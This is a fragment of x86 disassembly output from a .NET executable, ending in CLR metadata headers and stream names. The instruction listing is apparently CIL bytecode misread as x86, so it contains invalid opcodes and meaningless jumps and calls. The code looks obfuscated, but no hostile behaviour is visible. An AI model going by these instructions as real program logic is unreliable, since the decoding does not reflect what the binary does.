  4065cf:	11 0c 1a             	adc    %ecx,(%edx,%ebx,1)
  4065d2:	11 0c 1a             	adc    %ecx,(%edx,%ebx,1)
  4065d5:	95                   	xchg   %eax,%ebp
  4065d6:	11 0d 1a 95 5a 9e    	adc    %ecx,0x9e5a951a
  4065dc:	11 0c 1b             	adc    %ecx,(%ebx,%ebx,1)
  4065df:	11 0c 1b             	adc    %ecx,(%ebx,%ebx,1)
  4065e2:	95                   	xchg   %eax,%ebp
  4065e3:	11 0d 1b 95 58 9e    	adc    %ecx,0x9e58951b
  4065e9:	11 0c 1c             	adc    %ecx,(%esp,%ebx,1)
  4065ec:	11 0c 1c             	adc    %ecx,(%esp,%ebx,1)
  4065ef:	95                   	xchg   %eax,%ebp
  4065f0:	11 0d 1c 95 61 9e    	adc    %ecx,0x9e61951c
  4065f6:	11 17                	adc    %edx,(%edi)
  4065f8:	20 7f 51             	and    %bh,0x51(%edi)
  4065fb:	d2 3f                	sarb   %cl,(%edi)
  4065fd:	5a                   	pop    %edx
  4065fe:	20 c7                	and    %al,%bh
  406600:	3c 95                	cmp    $0x95,%al
  406602:	b1 61                	mov    $0x61,%cl
  406604:	38 a9 fa ff ff 08    	cmp    %ch,0x8fffffa(%ecx)
  40660a:	08 1f                	or     %bl,(%edi)
  40660c:	3c 58                	cmp    $0x58,%al
  40660e:	4b                   	dec    %ebx
  40660f:	e0 58                	loopne 0x406669
  406611:	25 1c 58 49 0d       	and    $0xd49581c,%eax
  406616:	25 1f 14 58 49       	and    $0x4958141f,%eax
  40661b:	13 04 16             	adc    (%esi,%edx,1),%eax
  40661e:	e0 13                	loopne 0x406633
  406620:	05 16 13 06 1f       	add    $0x1f061316,%eax
  406625:	18 58 11             	sbb    %bl,0x11(%eax)
  406628:	04 58                	add    $0x58,%al
  40662a:	13 07                	adc    (%edi),%eax
  40662c:	11 17                	adc    %edx,(%edi)
  40662e:	20 69 38             	and    %ch,0x38(%ecx)
  406631:	53                   	push   %ebx
  406632:	30 5a 20             	xor    %bl,0x20(%edx)
  406635:	66 2a 4a ce          	data16 sub -0x32(%edx),%cl
  406639:	61                   	popa
  40663a:	38 73 fa             	cmp    %dh,-0x6(%ebx)
  40663d:	ff                   	(bad)
  40663e:	ff 11                	call   *(%ecx)
  406640:	0a 19                	or     (%ecx),%bl
  406642:	64 11 0a             	adc    %ecx,%fs:(%edx)
  406645:	1f                   	pop    %ds
  406646:	1d 62 60 13 09       	sbb    $0x9136062,%eax
  40664b:	11 17                	adc    %edx,(%edi)
  40664d:	20 b2 0e dd 6c 5a    	and    %dh,0x5a6cdd0e(%edx)
  406653:	20 a1 58 d2 e0 61    	and    %ah,0x61e0d258(%ecx)
  406659:	38 54 fa ff          	cmp    %dl,-0x1(%edx,%edi,8)
  40665d:	ff 08                	decl   (%eax)
  40665f:	07                   	pop    %es
  406660:	2d 07 11 07 1a       	sub    $0x1a071107,%eax
  406665:	58                   	pop    %eax
  406666:	4b                   	dec    %ebx
  406667:	2b 08                	sub    (%eax),%ecx
  406669:	11 07                	adc    %eax,(%edi)
  40666b:	19 d3                	sbb    %edx,%ebx
  40666d:	1a 5a 58             	sbb    0x58(%edx),%bl
  406670:	4b                   	dec    %ebx
  406671:	e0 58                	loopne 0x4066cb
  406673:	13 05 07 3a cb fd    	adc    0xfdcb3a07,%eax
  406679:	ff                   	(bad)
  40667a:	ff 20                	jmp    *(%eax)
  40667c:	e8 d7 6a e8 38       	call   0x3928d158
  406681:	2d fa ff ff 11       	sub    $0x11fffffa,%eax
  406686:	0b 1d 64 11 0b 1f    	or     0x1f0b1164,%ebx
  40668c:	19 62 60             	sbb    %esp,0x60(%edx)
  40668f:	13 0a                	adc    (%edx),%ecx
  406691:	11 08                	adc    %ecx,(%eax)
  406693:	1f                   	pop    %ds
  406694:	0b 64 11 08          	or     0x8(%ecx,%edx,1),%esp
  406698:	1f                   	pop    %ds
  406699:	15 62 60 13 0b       	adc    $0xb136062,%eax
  40669e:	11 17                	adc    %edx,(%edi)
  4066a0:	20 bd 95 dc 3e 5a    	and    %bh,0x5a3edc95(%ebp)
  4066a6:	20 15 ae 82 2d 61    	and    %dl,0x612d82ae
  4066ac:	38 01                	cmp    %al,(%ecx)
  4066ae:	fa                   	cli
  4066af:	ff                   	(bad)
  4066b0:	ff 11                	call   *(%ecx)
  4066b2:	07                   	pop    %es
  4066b3:	1e                   	push   %ds
  4066b4:	d3 1a                	rcrl   %cl,(%edx)
  4066b6:	5a                   	pop    %edx
  4066b7:	58                   	pop    %eax
  4066b8:	13 07                	adc    (%edi),%eax
  4066ba:	11 10                	adc    %edx,(%eax)
  4066bc:	17                   	pop    %ss
  4066bd:	58                   	pop    %eax
  4066be:	13 10                	adc    (%eax),%edx
  4066c0:	20 b0 91 4a f2 38    	and    %dh,0x38f24a91(%eax)
  4066c6:	e8 f9 ff ff 11       	call   0x124066c4
  4066cb:	09 1b                	or     %ebx,(%ebx)
  4066cd:	64 11 09             	adc    %ecx,%fs:(%ecx)
  4066d0:	1f                   	pop    %ds
  4066d1:	1b 62 60             	sbb    0x60(%edx),%esp
  4066d4:	13 08                	adc    (%eax),%ecx
  4066d6:	11 17                	adc    %edx,(%edi)
  4066d8:	20 e5                	and    %ah,%ch
  4066da:	27                   	daa
  4066db:	6e                   	outsb  %ds:(%esi),(%dx)
  4066dc:	a3 5a 20 5f 88       	mov    %eax,0x885f205a
  4066e1:	e9 12 61 38 c9       	jmp    0xc978c7f8
  4066e6:	f9                   	stc
  4066e7:	ff                   	(bad)
  4066e8:	ff 2a                	ljmp   *(%edx)
  4066ea:	00 00                	add    %al,(%eax)
  4066ec:	14 67                	adc    $0x67,%al
	...
  4066f6:	00 00                	add    %al,(%eax)
  4066f8:	2e 67 00 00          	add    %al,%cs:(%bx,%si)
  4066fc:	00 e0                	add    %ah,%al
	...
  406712:	00 00                	add    %al,(%eax)
  406714:	20 67 00             	and    %ah,0x0(%edi)
	...
  40671f:	00 00                	add    %al,(%eax)
  406721:	00 5f 43             	add    %bl,0x43(%edi)
  406724:	6f                   	outsl  %ds:(%esi),(%dx)
  406725:	72 45                	jb     0x40676c
  406727:	78 65                	js     0x40678e
  406729:	4d                   	dec    %ebp
  40672a:	61                   	popa
  40672b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  406732:	72 65                	jb     0x406799
  406734:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  406738:	6c                   	insb   (%dx),%es:(%edi)
  406739:	00 00                	add    %al,(%eax)
  40673b:	00 42 53             	add    %al,0x53(%edx)
  40673e:	4a                   	dec    %edx
  40673f:	42                   	inc    %edx
  406740:	01 00                	add    %eax,(%eax)
  406742:	01 00                	add    %eax,(%eax)
  406744:	00 00                	add    %al,(%eax)
  406746:	00 00                	add    %al,(%eax)
  406748:	10 00                	adc    %al,(%eax)
  40674a:	00 00                	add    %al,(%eax)
  40674c:	76 34                	jbe    0x406782
  40674e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  406751:	33 30                	xor    (%eax),%esi
  406753:	33 31                	xor    (%ecx),%esi
  406755:	39 00                	cmp    %eax,(%eax)
  406757:	00 00                	add    %al,(%eax)
  406759:	00 00                	add    %al,(%eax)
  40675b:	00 00                	add    %al,(%eax)
  40675d:	00 08                	add    %cl,(%eax)
  40675f:	00 a8 00 00 00 4c    	add    %ch,0x4c000000(%eax)
  406765:	0c 00                	or     $0x0,%al
  406767:	00 23                	add    %ah,(%ebx)
  406769:	7e 00                	jle    0x40676b
  40676b:	00 f4                	add    %dh,%ah
  40676d:	0c 00                	or     $0x0,%al
  40676f:	00 68 42             	add    %ch,0x42(%eax)
  406772:	00 00                	add    %al,(%eax)
  406774:	23 53 74             	and    0x74(%ebx),%edx
  406777:	72 69                	jb     0x4067e2
  406779:	6e                   	outsb  %ds:(%esi),(%dx)
  40677a:	67 73 00             	addr16 jae 0x40677d
  40677d:	00 00                	add    %al,(%eax)
  40677f:	00 5c 4f 00          	add    %bl,0x0(%edi,%ecx,2)
  406783:	00 10                	add    %dl,(%eax)
  406785:	00 00                	add    %al,(%eax)
  406787:	00 23                	add    %ah,(%ebx)
  406789:	47                   	inc    %edi
  40678a:	55                   	push   %ebp
  40678b:	49                   	dec    %ecx
  40678c:	44                   	inc    %esp
  40678d:	00 00                	add    %al,(%eax)
  40678f:	00 6c 4f 00          	add    %ch,0x0(%edi,%ecx,2)
  406793:	00 e0                	add    %ah,%al
  406795:	03 00                	add    (%eax),%eax
  406797:	00 23                	add    %ah,(%ebx)
  406799:	42                   	inc    %edx
  40679a:	6c                   	insb   (%dx),%es:(%edi)
  40679b:	6f                   	outsl  %ds:(%esi),(%dx)
  40679c:	62 00                	bound  %eax,(%eax)
  40679e:	00 00                	add    %al,(%eax)
  4067a0:	4c                   	dec    %esp
  4067a1:	53                   	push   %ebx
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	10 00                	adc    %al,(%eax)
  4067a6:	00 00                	add    %al,(%eax)
  4067a8:	23 47 55             	and    0x55(%edi),%eax
  4067ab:	49                   	dec    %ecx
  4067ac:	44                   	inc    %esp
  4067ad:	00 00                	add    %al,(%eax)
  4067af:	00 5c 53 00          	add    %bl,0x0(%ebx,%edx,2)
  4067b3:	00 04 00             	add    %al,(%eax,%eax,1)
  4067b6:	00 00                	add    %al,(%eax)
  4067b8:	23 53 74             	and    0x74(%ebx),%edx
  4067bb:	72 69                	jb     0x406826
  4067bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4067be:	67 73 00             	addr16 jae 0x4067c1
  4067c1:	00 00                	add    %al,(%eax)
  4067c3:	00 60 53             	add    %ah,0x53(%eax)
  4067c6:	00 00                	add    %al,(%eax)
  4067c8:	04 00                	add    $0x0,%al
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	23 42 6c             	and    0x6c(%edx),%eax
  4067cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4067d0:	62 00                	bound  %eax,(%eax)
  4067d2:	00 00                	add    %al,(%eax)
  4067d4:	64 53                	fs push %ebx
  4067d6:	00 00                	add    %al,(%eax)
  4067d8:	04 00                	add    $0x0,%al
  4067da:	00 00                	add    %al,(%eax)
  4067dc:	23 53 63             	and    0x63(%ebx),%edx
  4067df:	68 65 6d 61 00       	push   $0x616d65
  4067e4:	00 00                	add    %al,(%eax)
  4067e6:	00 00                	add    %al,(%eax)
  4067e8:	02 00                	add    (%eax),%al
  4067ea:	40                   	inc    %eax
  4067eb:	01 57 d5             	add    %edx,-0x2b(%edi)
  4067ee:	02 fc                	add    %ah,%bh
  4067f0:	09 0e                	or     %ecx,(%esi)
  4067f2:	00 00                	add    %al,(%eax)
  4067f4:	00 fa                	add    %bh,%dl
  4067f6:	25 33 00 16 00       	and    $0x160033,%eax
  4067fb:	00 02                	add    %al,(%edx)
  4067fd:	00 00                	add    %al,(%eax)
  4067ff:	00 2c 00             	add    %ch,(%eax,%eax,1)
  406802:	00 00                	add    %al,(%eax)
  406804:	0d 00 00 00 2b       	or     $0x2b000000,%eax
  406809:	00 00                	add    %al,(%eax)
  40680b:	00 4f 00             	add    %cl,0x0(%edi)
  40680e:	00 00                	add    %al,(%eax)
  406810:	3c 00                	cmp    $0x0,%al
  406812:	00 00                	add    %al,(%eax)
  406814:	3e 00 00             	add    %al,%ds:(%eax)
  406817:	00 10                	add    %dl,(%eax)
  406819:	00 00                	add    %al,(%eax)
  40681b:	00 01                	add    %al,(%ecx)
  40681d:	00 00                	add    %al,(%eax)
  40681f:	00 01                	add    %al,(%ecx)
  406821:	00 00                	add    %al,(%eax)
  406823:	00 10                	add    %dl,(%eax)
  406825:	00 00                	add    %al,(%eax)
  406827:	00 01                	add    %al,(%ecx)
  406829:	00 00                	add    %al,(%eax)
  40682b:	00 01                	add    %al,(%ecx)
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 01                	add    %al,(%ecx)
  406831:	00 00                	add    %al,(%eax)
  406833:	00 01                	add    %al,(%ecx)
  406835:	00 00                	add    %al,(%eax)
  406837:	00 0a                	add    %cl,(%edx)
  406839:	00 00                	add    %al,(%eax)
  40683b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40683e:	00 00                	add    %al,(%eax)
  406840:	02 00                	add    (%eax),%al
  406842:	00 00                	add    %al,(%eax)
  406844:	02 00                	add    (%eax),%al
  406846:	00 00                	add    %al,(%eax)
  406848:	0a 00                	or     (%eax),%al
  40684a:	00 00                	add    %al,(%eax)
  40684c:	05 00 00 00 04       	add    $0x4000000,%eax
  406851:	00 00                	add    %al,(%eax)
  406853:	00 4d d0             	add    %cl,-0x30(%ebp)
  406856:	47                   	inc    %edi
  406857:	37                   	aaa
  406858:	00 00                	add    %al,(%eax)
  40685a:	f9                   	stc
  40685b:	02 01                	add    (%ecx),%al
  40685d:	00 00                	add    %al,(%eax)
  40685f:	00 00                	add    %al,(%eax)
  406861:	00 00                	add    %al,(%eax)
  406863:	00 ff                	add    %bh,%bh
  406865:	7f 00                	jg     0x406867
  406867:	00 00                	add    %al,(%eax)
  406869:	00 00                	add    %al,(%eax)
  40686b:	00 06                	add    %al,(%esi)
  40686d:	00 b9 01 a0 04 06    	add    %bh,0x604a001(%ecx)
  406873:	00 08                	add    %cl,(%eax)
  406875:	01 ca                	add    %ecx,%edx
  406877:	03 06                	add    (%esi),%eax
  406879:	00 7e 05             	add    %bh,0x5(%esi)
  40687c:	ca 03 06             	lret   $0x603
  40687f:	00 bc 03 31 00 06 00 	add    %bh,0x60031(%ebx,%eax,1)
  406886:	0e                   	push   %cs
  406887:	04 31                	add    $0x31,%al
  406889:	00 0a                	add    %cl,(%edx)
  40688b:	00 fd                	add    %bh,%ch
  40688d:	03 6e 04             	add    0x4(%esi),%ebp
  406890:	0a 00                	or     (%eax),%al
  406892:	c9                   	leave
  406893:	00 6e 04             	add    %ch,0x4(%esi)
  406896:	0a 00                	or     (%eax),%al
  406898:	2c 05                	sub    $0x5,%al
  40689a:	6e                   	outsb  %ds:(%esi),(%dx)
  40689b:	04 06                	add    $0x6,%al
  40689d:	00 bf 02 ca 03 06    	add    %bh,0x603ca02(%edi)
  4068a3:	00 2a                	add    %ch,(%edx)
  4068a5:	02 a0 04 06 00 ab    	add    -0x54fff9fc(%eax),%ah
  4068ab:	02 a0 04 06 00 46    	add    0x46000604(%eax),%ah
  4068b1:	01 6e 04             	add    %ebp,0x4(%esi)
  4068b4:	33 00                	xor    (%eax),%eax
  4068b6:	c0 04 00 00          	rolb   $0x0,(%eax,%eax,1)
  4068ba:	06                   	push   %es
  4068bb:	00 6e 01             	add    %ch,0x1(%esi)
  4068be:	e4 03                	in     $0x3,%al
  4068c0:	06                   	push   %es
  4068c1:	00 0d 02 e4 03 06    	add    %cl,0x603e402
  4068c7:	00 ee                	add    %ch,%dh
  4068c9:	01 e4                	add    %esp,%esp
  4068cb:	03 06                	add    (%esi),%eax
  4068cd:	00 92 02 e4 03 06    	add    %dl,0x603e402(%edx)
  4068d3:	00 4a 02             	add    %cl,0x2(%edx)
  4068d6:	e4 03                	in     $0x3,%al
  4068d8:	06                   	push   %es
  4068d9:	00 63 02             	add    %ah,0x2(%ebx)
  4068dc:	e4 03                	in     $0x3,%al
  4068de:	06                   	push   %es
  4068df:	00 85 01 e4 03 06    	add    %al,0x603e401(%ebp)
  4068e5:	00 5a 01             	add    %bl,0x1(%edx)
  4068e8:	81 04 06 00 38 01 81 	addl   $0x81013800,(%esi,%eax,1)
  4068ef:	04 06                	add    $0x6,%al
  4068f1:	00 d1                	add    %dl,%cl
  4068f3:	01 e4                	add    %esp,%esp
  4068f5:	03 06                	add    (%esi),%eax
  4068f7:	00 a0 01 3e 03 06    	add    %ah,0x6033e01(%eax)
  4068fd:	00 b6 03 31 00 06    	add    %dh,0x6003103(%esi)
  406903:	00 f4                	add    %dh,%ah
  406905:	02 ca                	add    %dl,%cl
  406907:	03 06                	add    (%esi),%eax
  406909:	00 29                	add    %ch,(%ecx)
  40690b:	06                   	push   %es
  40690c:	ca 03 06             	lret   $0x603
  40690f:	00 33                	add    %dh,(%ebx)
  406911:	04 ca                	add    $0xca,%al
  406913:	03 06                	add    (%esi),%eax
  406915:	00 03                	add    %al,(%ebx)
  406917:	00 ca                	add    %cl,%dl
  406919:	03 06                	add    (%esi),%eax
  40691b:	00 1d 05 a0 04 06    	add    %bl,0x604a005
  406921:	00 72 00             	add    %dh,0x0(%edx)
  406924:	ca 03 06             	lret   $0x603
  406927:	00 4e 06             	add    %cl,0x6(%esi)
  40692a:	e4 03                	in     $0x3,%al
  40692c:	06                   	push   %es
  40692d:	00 35 03 f1 05 06    	add    %dh,0x605f103
  406933:	00 5b 03             	add    %bl,0x3(%ebx)
  406936:	ca 03 06             	lret   $0x603
  406939:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  40693c:	ca 03 06             	lret   $0x603
  40693f:	00 85 00 ca 03 06    	add    %al,0x603ca00(%ebp)
  406945:	00 2c 04             	add    %ch,(%esp,%eax,1)
  406948:	ca 03 06             	lret   $0x603
  40694b:	00 b2 00 e4 03 06    	add    %dh,0x603e400(%edx)
  406951:	00 8e 03 81 04 06    	add    %cl,0x6048103(%esi)
  406957:	00 67 04             	add    %ah,0x4(%edi)
  40695a:	ca 03 06             	lret   $0x603
  40695d:	00 72 03             	add    %dh,0x3(%edx)
  406960:	ca 03 06             	lret   $0x603
  406963:	00 7e 03             	add    %bh,0x3(%esi)
  406966:	31 00                	xor    %eax,(%eax)
  406968:	06                   	push   %es
  406969:	00 a9 00 31 00 06    	add    %ch,0x6003100(%ecx)
  40696f:	00 67 06             	add    %ah,0x6(%edi)
  406972:	31 00                	xor    %eax,(%eax)
  406974:	00 00                	add    %al,(%eax)
  406976:	00 00                	add    %al,(%eax)
  406978:	1b 00                	sbb    (%eax),%eax
  40697a:	00 00                	add    %al,(%eax)
  40697c:	00 00                	add    %al,(%eax)
  40697e:	01 00                	add    %eax,(%eax)
  406980:	01 00                	add    %eax,(%eax)
  406982:	0d 01 10 00 50       	or     $0x50001001,%eax
  406987:	36 00 00             	add    %al,%ss:(%eax)
  40698a:	09 00                	or     %eax,(%eax)
  40698c:	03 00                	add    (%eax),%eax
  40698e:	0b 00                	or     (%eax),%eax
  406990:	0d 01 10 00 c4       	or     $0xc4001001,%eax
  406995:	37                   	aaa
  406996:	00 00                	add    %al,(%eax)
  406998:	09 00                	or     %eax,(%eax)
  40699a:	04 00                	add    $0x0,%al
  40699c:	0d 00 05 00 10       	or     $0x10000500,%eax
  4069a1:	00 1e                	add    %bl,(%esi)
  4069a3:	10 00                	adc    %al,(%eax)
  4069a5:	00 0d 00 06 00 12    	add    %cl,0x12000600
  4069ab:	00 05 00 10 00 87    	add    %al,0x87001000
  4069b1:	12 00                	adc    (%eax),%al
  4069b3:	00 0d 00 09 00 17    	add    %cl,0x17000900
  4069b9:	00 05 00 10 00 fb    	add    %al,0xfb001000
  4069bf:	13 00                	adc    (%eax),%eax
  4069c1:	00 0d 00 1b 00 1f    	add    %cl,0x1f001b00
  4069c7:	00 05 00 10 00 e8    	add    %al,0xe8001000
  4069cd:	15 00 00 0d 00       	adc    $0xd0000,%eax
  4069d2:	21 00                	and    %eax,(%eax)
  4069d4:	23 00                	and    (%eax),%eax
  4069d6:	0d 01 10 00 20       	or     $0x20001001,%eax
  4069db:	3c 00                	cmp    $0x0,%al
  4069dd:	00 09                	add    %cl,(%ecx)
  4069df:	00 25 00 29 00 05    	add    %ah,0x5002900
  4069e5:	00 10                	add    %dl,(%eax)
  4069e7:	00 f4                	add    %dh,%ah
  4069e9:	31 00                	xor    %eax,(%eax)
  4069eb:	00 0d 00 26 00 2d    	add    %cl,0x2d002600
  4069f1:	00 0d 01 10 00 60    	add    %cl,0x60001001
  4069f7:	34 00                	xor    $0x0,%al
  4069f9:	00 09                	add    %cl,(%ecx)
  4069fb:	00 2b                	add    %ch,(%ebx)
  4069fd:	00 35 00 15 01 00    	add    %dh,0x11500
  406a03:	00 26                	add    %ah,(%esi)
  406a05:	0f 00 00             	sldt   (%eax)
  406a08:	09 00                	or     %eax,(%eax)
  406a0a:	2c 00                	sub    $0x0,%al
  406a0c:	3b 00                	cmp    (%eax),%eax
  406a0e:	00 00                	add    %al,(%eax)
  406a10:	10 00                	adc    %al,(%eax)
  406a12:	f3 14 00             	repz adc $0x0,%al
  406a15:	00 0d 00 2c 00 3b    	add    %cl,0x3b002c00
  406a1b:	00 00                	add    %al,(%eax)
  406a1d:	00 00                	add    %al,(%eax)
  406a1f:	00 7e 02             	add    %bh,0x2(%esi)
  406a22:	00 00                	add    %al,(%eax)
  406a24:	25 00 2c 00 4f       	and    $0x4f002c00,%eax
  406a29:	00 13                	add    %dl,(%ebx)
  406a2b:	00 9c 3c 37 00 13 01 	add    %bl,0x1130037(%esp,%edi,1)
  406a32:	71 06                	jno    0x406a3a
  406a34:	3b 00                	cmp    (%eax),%eax
  406a36:	03 00                	add    (%eax),%eax
  406a38:	7e 3f                	jle    0x406a79
  406a3a:	5a                   	pop    %edx
  406a3b:	00 23                	add    %ah,(%ebx)
  406a3d:	00 a2 0f 63 00 23    	add    %ah,0x2300630f(%edx)
  406a43:	00 b2 0d 68 00 03    	add    %dh,0x300680d(%edx)
  406a49:	00 8a 20 5a 00 03    	add    %cl,0x3005a20(%edx)
  406a4f:	00 88 2f 5a 00 03    	add    %cl,0x3005a2f(%eax)
  406a55:	00 fe                	add    %bh,%dh
  406a57:	21 7b 00             	and    %edi,0x0(%ebx)
  406a5a:	23 00                	and    (%eax),%eax
  406a5c:	da 08                	fimull (%eax)
  406a5e:	63 00                	arpl   %eax,(%eax)
  406a60:	23 00                	and    (%eax),%eax
  406a62:	aa                   	stos   %al,%es:(%edi)
  406a63:	0e                   	push   %cs
  406a64:	63 00                	arpl   %eax,(%eax)
  406a66:	23 00                	and    (%eax),%eax
  406a68:	40                   	inc    %eax
  406a69:	38 63 00             	cmp    %ah,0x0(%ebx)
  406a6c:	23 00                	and    (%eax),%eax
  406a6e:	d0 18                	rcrb   $1,(%eax)
  406a70:	63 00                	arpl   %eax,(%eax)
  406a72:	23 00                	and    (%eax),%eax
  406a74:	06                   	push   %es
  406a75:	21 63 00             	and    %esp,0x0(%ebx)
  406a78:	23 00                	and    (%eax),%eax
  406a7a:	c2 0b 63             	ret    $0x630b
  406a7d:	00 23                	add    %ah,(%ebx)
  406a7f:	00 78 31             	add    %bh,0x31(%eax)
  406a82:	8a 00                	mov    (%eax),%al
  406a84:	23 00                	and    (%eax),%eax
  406a86:	e3 24                	jecxz  0x406aac
  406a88:	8e 00                	mov    (%eax),%es
  406a8a:	23 00                	and    (%eax),%eax
  406a8c:	b4 39                	mov    $0x39,%ah
  406a8e:	92                   	xchg   %eax,%edx
  406a8f:	00 23                	add    %ah,(%ebx)
  406a91:	00 eb                	add    %ch,%bl
  406a93:	23 63 00             	and    0x0(%ebx),%esp
  406a96:	23 00                	and    (%eax),%eax
  406a98:	d3 26                	shll   %cl,(%esi)
  406a9a:	96                   	xchg   %eax,%esi
  406a9b:	00 23                	add    %ah,(%ebx)
  406a9d:	00 5c 17 9b          	add    %bl,-0x65(%edi,%edx,1)
  406aa1:	00 23                	add    %ah,(%ebx)
  406aa3:	00 94 3d 8a 00 03 00 	add    %dl,0x3008a(%ebp,%edi,1)
  406aaa:	04 30                	add    $0x30,%al
  406aac:	9f                   	lahf
  406aad:	00 03                	add    %al,(%ebx)
  406aaf:	00 3f                	add    %bh,(%edi)
  406ab1:	29 5a 00             	sub    %ebx,0x0(%edx)
  406ab4:	03 00                	add    (%eax),%eax
  406ab6:	4c                   	dec    %esp
  406ab7:	19 5a 00             	sbb    %ebx,0x0(%edx)
  406aba:	03 00                	add    (%eax),%eax
  406abc:	dc 34 a2             	fdivl  (%edx,%eiz,4)
  406abf:	00 03                	add    %al,(%ebx)
  406ac1:	00 31                	add    %dh,(%ecx)
  406ac3:	1c 5a                	sbb    $0x5a,%al
  406ac5:	00 23                	add    %ah,(%ebx)
  406ac7:	00 b3 2a 96 00 23    	add    %dh,0x2300962a(%ebx)
  406acd:	00 aa 1c 96 00 03    	add    %ch,0x300961c(%edx)
  406ad3:	00 6f 23             	add    %ch,0x23(%edi)
  406ad6:	ce                   	into
  406ad7:	00 03                	add    %al,(%ebx)
  406ad9:	00 30                	add    %dh,(%eax)
  406adb:	3a ce                	cmp    %dh,%cl
  406add:	00 03                	add    %al,(%ebx)
  406adf:	00 9a 1e a2 00 03    	add    %bl,0x300a21e(%edx)
  406ae5:	00 48 37             	add    %cl,0x37(%eax)
  406ae8:	5a                   	pop    %edx
  406ae9:	00 03                	add    %al,(%ebx)
  406aeb:	00 ab 2b d9 00 03    	add    %ch,0x300d92b(%ebx)
  406af1:	00 8f 11 68 00 03    	add    %cl,0x3006811(%edi)
  406af7:	00 38                	add    %bh,(%eax)
  406af9:	39 68 00             	cmp    %ebp,0x0(%eax)
  406afc:	03 00                	add    (%eax),%eax
  406afe:	44                   	inc    %esp
  406aff:	1a 5a 00             	sbb    0x0(%edx),%bl
  406b02:	03 00                	add    (%eax),%eax
  406b04:	02 3f                	add    (%edi),%bh
  406b06:	63 00                	arpl   %eax,(%eax)
  406b08:	03 00                	add    (%eax),%eax
  406b0a:	b5 1b                	mov    $0x1b,%ch
  406b0c:	37                   	aaa
  406b0d:	00 03                	add    %al,(%ebx)
  406b0f:	00 26                	add    %ah,(%esi)
  406b11:	1d 5a 00 03 00       	sbb    $0x3005a,%eax
  406b16:	9b                   	fwait
  406b17:	2d 7b 00 03 00       	sub    $0x3007b,%eax
  406b1c:	92                   	xchg   %eax,%edx
  406b1d:	1f                   	pop    %ds
  406b1e:	5a                   	pop    %edx
  406b1f:	00 03                	add    %al,(%ebx)
  406b21:	00 2f                	add    %ch,(%edi)
  406b23:	2b 5a 00             	sub    0x0(%edx),%ebx
  406b26:	03 00                	add    (%eax),%eax
  406b28:	a3 2c 5a 00 50       	mov    %eax,0x50005a2c
  406b2d:	60                   	pusha
  406b2e:	00 00                	add    %al,(%eax)
  406b30:	00 00                	add    %al,(%eax)
  406b32:	91                   	xchg   %eax,%ecx
  406b33:	18 60 04             	sbb    %ah,0x4(%eax)
  406b36:	3f                   	aas
  406b37:	00 01                	add    %al,(%ecx)
  406b39:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  406b3f:	00 93 00 ec 32 43    	add    %dl,0x4332ec00(%ebx)
  406b45:	00 01                	add    %al,(%ecx)
  406b47:	00 3c 22             	add    %bh,(%edx,%eiz,1)
  406b4a:	00 00                	add    %al,(%eax)
  406b4c:	00 00                	add    %al,(%eax)
  406b4e:	93                   	xchg   %eax,%ebx
  406b4f:	00 8c 3e 3f 00 02 00 	add    %cl,0x2003f(%esi,%edi,1)
  406b56:	14 27                	adc    $0x27,%al
  406b58:	00 00                	add    %al,(%eax)
  406b5a:	00 00                	add    %al,(%eax)
  406b5c:	93                   	xchg   %eax,%ebx
  406b5d:	00 fc                	add    %bh,%ah
  406b5f:	30 4a 00             	xor    %cl,0x0(%edx)
  406b62:	02 00                	add    (%eax),%al
  406b64:	e4 29                	in     $0x29,%al
  406b66:	00 00                	add    %al,(%eax)
  406b68:	00 00                	add    %al,(%eax)
  406b6a:	93                   	xchg   %eax,%ebx
  406b6b:	00 c0                	add    %al,%al
  406b6d:	1a 4a 00             	sbb    0x0(%edx),%cl
  406b70:	03 00                	add    (%eax),%eax
  406b72:	f8                   	clc
  406b73:	2c 00                	sub    $0x0,%al
  406b75:	00 00                	add    %al,(%eax)
  406b77:	00 93 00 4e 0a 4a    	add    %dl,0x4a0a4e00(%ebx)
  406b7d:	00 04 00             	add    %al,(%eax,%eax,1)
  406b80:	f4                   	hlt
  406b81:	2f                   	das
  406b82:	00 00                	add    %al,(%eax)
  406b84:	00 00                	add    %al,(%eax)
  406b86:	93                   	xchg   %eax,%ebx
  406b87:	00 46 0b             	add    %al,0xb(%esi)
  406b8a:	4a                   	dec    %edx
  406b8b:	00 05 00 f8 32 00    	add    %al,0x32f800
  406b91:	00 00                	add    %al,(%eax)
  406b93:	00 93 00 68 33 4a    	add    %dl,0x4a336800(%ebx)
  406b99:	00 06                	add    %al,(%esi)
  406b9b:	00 00                	add    %al,(%eax)
  406b9d:	00 00                	add    %al,(%eax)
  406b9f:	00 80 00 93 20 39    	add    %al,0x39209300(%eax)
  406ba5:	1b 51 00             	sbb    0x0(%ecx),%edx
  406ba8:	07                   	pop    %es
  406ba9:	00 68 60             	add    %ch,0x60(%eax)
  406bac:	00 00                	add    %al,(%eax)
  406bae:	00 00                	add    %al,(%eax)
  406bb0:	93                   	xchg   %eax,%ebx
  406bb1:	00 36                	add    %dh,(%esi)
  406bb3:	0d 3f 00 0b 00       	or     $0xb003f,%eax
  406bb8:	2c 36                	sub    $0x36,%al
  406bba:	00 00                	add    %al,(%eax)
  406bbc:	00 00                	add    %al,(%eax)
  406bbe:	83 00 13             	addl   $0x13,(%eax)
  406bc1:	11 0a                	adc    %ecx,(%edx)
  406bc3:	00 0b                	add    %cl,(%ebx)
  406bc5:	00 44 36 00          	add    %al,0x0(%esi,%esi,1)
  406bc9:	00 00                	add    %al,(%eax)
  406bcb:	00 83 00 a2 1d 5d    	add    %al,0x5d1da200(%ebx)
  406bd1:	00 0b                	add    %cl,(%ebx)
  406bd3:	00 04 38             	add    %al,(%eax,%edi,1)
  406bd6:	00 00                	add    %al,(%eax)
  406bd8:	00 00                	add    %al,(%eax)
  406bda:	83 18 5a             	sbbl   $0x5a,(%eax)
  406bdd:	04 6b                	add    $0x6b,%al
  406bdf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406be2:	2c 38                	sub    $0x38,%al
